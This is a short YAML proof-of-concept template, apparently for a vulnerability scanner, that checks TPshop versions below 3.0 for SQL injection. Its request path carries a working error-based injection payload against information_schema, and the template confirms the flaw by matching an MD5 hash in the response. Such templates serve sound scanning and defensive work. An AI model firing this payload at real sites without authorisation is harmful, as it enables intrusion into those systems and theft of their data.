detail:
  Affected Version: tpshop<3.0
  author: hanxiansheng26(https://github.com/hanxiansheng26)
  links:
  - https://xz.aliyun.com/t/6635
expression: r0()
manual: true
name: poc-yaml-tpshop-sqli
rules:
  r0:
    expression: response.body.bcontains(bytes(md5(string(r))))
    request:
      cache: true
      follow_redirects: true
      method: GET
      path: /mobile/index/index2/id/1) and (select 1 from (select count(*),concat(0x716b627671,(select
        md5({{r}})),0x716b627671,floor(rand(0)*2))x from information_schema.tables
        group by x)a)--
set:
  r: randomInt(800000000, 1000000000)
transport: http
